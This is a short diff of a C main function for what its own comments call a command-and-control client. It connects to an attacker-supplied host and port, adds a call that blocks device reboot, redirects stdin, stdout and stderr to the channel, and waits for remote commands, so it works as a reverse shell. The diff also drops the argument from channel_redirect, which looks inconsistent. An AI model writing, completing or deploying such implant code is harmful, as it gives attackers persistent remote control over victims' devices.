@@ -24,20 +24,22 @@
 
 #include <stdlib.h>
 
+#include "utils.h"
 #include "console.h"
 #include "channel.h"
 
 int main(int argc, char *argv[])
 {
     if (argc == 3) {
-        int channel = channel_open(argv[1], atoi(argv[2]));
+        int channel = channel_open(argv[1], atoi(argv[2])); /* open channel with C2 server */
         if (channel < 0)
             return -1;
 
-        channel_redirect(channel);
-        console_interact(channel);
+        prevent_reboot(); /* prevent device reboot */
+        channel_redirect(); /* redirect stdout, stderr and stdin to channel */
+        console_interact(channel); /* interact with channel, listen for commands */
 
-        channel_close(channel);
+        channel_close(channel); /* close current active channel */
     }
     return 0;
 }
